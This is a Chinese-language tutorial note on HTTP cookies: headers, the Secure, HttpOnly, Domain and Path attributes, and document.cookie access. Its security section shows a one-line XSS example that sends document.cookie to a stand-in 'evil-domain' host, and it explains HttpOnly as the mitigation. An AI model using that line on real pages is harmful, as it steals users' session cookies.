# cookie

## HTTP传送cookie

- HTTP响应报文，**创建cookie**

```http
Set-Cookie: <cookie-name>=<cookie-value>
```

- HTTP请求报文，**返回cookie**

```http
Cookie: <cookie-name>=<cookie-value>; <cookie-name>=<cookie-value>
```

- 设置**Secure**和**HttpOnly**

一个 `Secure Cookie` 只可以发送给https协议的服务器，尽管它写作secure，但是不应该在cookie里保存敏感信息。

设置 `HttpOnly` 可以保证Cookie只可以发送给服务器，而不被Document.cookie API访问。

```http
Set-Cookie: id=123; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

- cookie的范围

`Domain `可以设置接收端的域名，如果不设置，默认是当前域名而不包括子域名。如果Domain字段被设置，字域名就会包括进去。

如果 `Domain=mozilla.org`， 则cookie包括子域名 `developer.mozilla.org` 。

`Path`  表示cookie所在的目录。

## DOM操作cookie

- 获取一个域名下的所有cookie

```js
allCookies = document.cookie;

// "_ga=GA1.2.1125311927.1554943341; dwf_sg_task_completion=False; django_language=zh-CN; csrftoken=PC9EJgRhmxzElVf0jtMljoN2RWBvdoMzo9E504a7QFQscCzyua2d2rSt9v4KvhNW; lux_uid=156924532189287124"
```

上面每条cookie以分号和空格分隔。

- 写一个新的cookie

```js
document.cookie = newCookie;
```

newCookie是一个键值对形式的字符串。需要注意的是，用这个方法一次只能对一个cookie进行设置或更新。

```js
// 示例

document.cookie = 'name=shi';
```

- 删除一个cookie

通过设置一个cookie的过期时间为0可以删除一个cookie。

# 安全

路径限制不能阻止从其他路径访问cookie。使用简单的DOM即可轻易地绕过限制。保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下，利用同源策略保护其不被读取。

窃听cookie的常见方法包括社会工程和XSS攻击：

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

HttpOnly属性可以阻止通过javascript访问cookie，从而在一定程度上遏制这类攻击。

